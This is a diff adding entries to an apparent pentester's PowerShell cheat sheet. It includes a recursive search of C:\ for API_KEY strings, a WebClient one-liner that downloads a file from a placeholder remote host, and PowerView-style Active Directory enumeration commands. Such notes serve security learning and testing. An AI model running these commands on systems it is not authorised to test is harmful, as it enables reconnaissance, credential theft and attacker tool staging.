@@ -52,4 +52,17 @@ Get-Hotfix | measure =  to findnumber of patches
 Get-Hotfix -Id KB4023834 =  to find  a particular patch
 Get-ChildItem C:\* -Recurse | Select-String -pattern API_KEY =  to search files with specifc key
 Get-Process = to list all process
+Start-Process = command can be used to start a process
+Get-Content = Similar to “cat” on Linux and “type” on the Windows command-line
+Copy-Item = Files can be copied and moved with “Copy-Item” and “Move-Item”respectively.
+Get-FileHash = command can be used to obtain hashes on most formats
+(new-object system.net.webclient).downloadfile('http://remoteip:port/filename','new_filename') = download remote file (python3 http.server)
+Get-Hotfix =  command can be used to enumerate already installed patches.
+Get-NetDomainController = This command will collect information on the domain controller.
+Get-NetUser = This command will provide a list of domain users
+Get-NetComputer = This command is useful to enumerate systems connected to the domain. 
+Get-NetGroup =  command will help us enumerate existing groups.
+Find-DomainShare = will list available shares.
+Get-NetGPO =  command will gather information on enforced policies. 
+Get-NetDomainTrust =  command will list any domain you may access
 
